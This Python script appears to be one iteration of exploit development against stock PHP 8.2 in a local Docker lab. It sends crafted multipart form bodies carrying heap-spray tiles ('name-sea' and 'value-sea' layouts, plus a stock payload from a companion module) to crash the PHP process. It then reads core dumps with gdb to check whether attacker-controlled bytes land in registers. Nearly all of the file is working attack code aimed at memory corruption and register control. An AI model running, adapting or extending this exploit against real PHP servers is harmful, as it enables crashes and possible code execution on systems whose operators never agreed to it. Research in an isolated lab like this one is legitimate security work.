#!/usr/bin/env python3
"""oom134: CONTROL — stock vs name-sea vs value-sea on ONE boot.

oom133 value-sea: 0 crashes in 16 fires (name-sea crashed every round).
Question: is the boot broken, or does the value-sea body itself suppress
the crash? Fire three bodies on one boot, pull rdi from each core:
  A) stock verbatim (payload68)      -> expect crash, rdi = K*8
  B) name-sea (oom132 design)        -> expect crash, rdi = T16 tile bytes
  C) value-sea (oom133 design)       -> crash? rdi = ?
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8083"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
KEYLEN = P.KEYLEN
K1 = 4200
TAG_PART = 830
MAGIC = 0xC0DEBA5E
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
T16 = SIG8 + struct.pack("<Q", 0xDFE2C0DE51E2C0DF)
VLEN = 1537
SEA_VLEN = 3056
SEA_SHRINK = 3039
SEA_LO, SEA_HI = 784, 864

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8083:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def tag8(i):
    return struct.pack("<QQ", MAGIC + i, MAGIC + i)

# ---- oom132-style name-sea body (tiles in NAMES 700..1000, tag value 830) ----
def name132(i, tile=None, shrink=0):
    if tile is not None:
        fill = ((KEYLEN - 8 - shrink) // 16) * 16
        filler = (tile * (fill // len(tile) + 1))[:fill]
    else:
        filler = b"K" * (KEYLEN - 8 - shrink)
    return (b'--BOUND\r\nContent-Disposition: form-data; name="p' + filler
            + b"%d" % i + b'[x]"\r\n\r\n')

def val132(i, tag=False):
    if tag:
        return tag8(i) + b"v" * (VLEN - 32) + tag8(i)
    return b"v"

def build_name_sea():
    ps = []
    for i in range(K1):
        intile = 700 <= i < 1000
        shrink = 1536 if i == TAG_PART else 0
        ps.append(name132(i, tile=(T16 if intile else None), shrink=shrink)
                  + val132(i, tag=(i == TAG_PART)) + b"\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

# ---- oom133-style value-sea body (tiles in VALUES 784..863, tag value 830) ----
def build_value_sea():
    ps = []
    for i in range(K1):
        if SEA_LO <= i < SEA_HI:
            nm = name132(i, shrink=SEA_SHRINK)
            ps.append(nm + T16 * (SEA_VLEN // 16) + b"\r\n")
        elif i == TAG_PART:
            ps.append(name132(i, shrink=1536) + val132(i, tag=True) + b"\r\n")
        else:
            ps.append(name132(i) + b"v\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def fire(tag, body, tries, want_crash):
    for t in range(tries):
        sh("rm -f /tmp/core")
        n0 = segv_count()
        c, r = post_mod(body)
        crashed = False
        for _ in range(10):
            time.sleep(2)
            if segv_count() > n0 or sh("test -f /tmp/core && echo y") == "y":
                crashed = True
                break
        print("%s try%d: http=%s segv+%d core=%s"
              % (tag, t, c, segv_count() - n0,
                 sh("test -f /tmp/core && echo y") == "y"), flush=True)
        if crashed == want_crash:
            return crashed
    return crashed

def pull_core(dst):
    subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core.tmp"], capture_output=True)
    subprocess.run(["docker", "cp", "/tmp/core.tmp", "phpbuild:" + dst], capture_output=True)

def core_rdi(corepath):
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                    'printf "set pagination off\\nset confirm off\\ninfo registers rdi rip\\nquit\\n" > /tmp/g134.gdb'],
                    capture_output=True)
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g134.gdb /tmp/libphp.stock.so %s 2>&1 | grep -E '^rdi|^rip'" % corepath],
                       capture_output=True, timeout=240)
    return r.stdout.decode("latin1").strip()

def phase_of(rdi_txt):
    m = re.search(r"rdi\s+0x([0-9a-f]+)", rdi_txt)
    if not m:
        return None
    rb = struct.pack("<Q", int(m.group(1), 16))
    return next((i for i in range(16) if (T16 + T16)[i:i + 8] == rb), None)

print("=== oom134 control: stock / name-sea / value-sea ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock: " + md5
print("md5 ok", flush=True)

for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped segv=%d" % segv_count(), flush=True)

stock = P.build_attack(4200, 5000000)
nsea = build_name_sea()
vsea = build_value_sea()
print("lens: stock=%d namesea=%d valuesea=%d" % (len(stock), len(nsea), len(vsea)), flush=True)

print("--- A: stock ---", flush=True)
if fire("A-stock", stock, tries=4, want_crash=True):
    pull_core("/tmp/core.134_A")
    txt = core_rdi("/tmp/core.134_A")
    print("A rdi: %s" % txt, flush=True)
else:
    print("A: NO CRASH (boot broken?)", flush=True)

print("--- B: name-sea ---", flush=True)
if fire("B-nsea", nsea, tries=3, want_crash=True):
    pull_core("/tmp/core.134_B")
    txt = core_rdi("/tmp/core.134_B")
    print("B rdi: %s phase=%s" % (txt, phase_of(txt)), flush=True)
else:
    print("B: NO CRASH (name-sea gone!)", flush=True)

print("--- C: value-sea ---", flush=True)
if fire("C-vsea", vsea, tries=3, want_crash=True):
    pull_core("/tmp/core.134_C")
    txt = core_rdi("/tmp/core.134_C")
    print("C rdi: %s phase=%s" % (txt, phase_of(txt)), flush=True)
else:
    print("C: NO CRASH (value-sea suppresses)", flush=True)

print("=== done ===", flush=True)
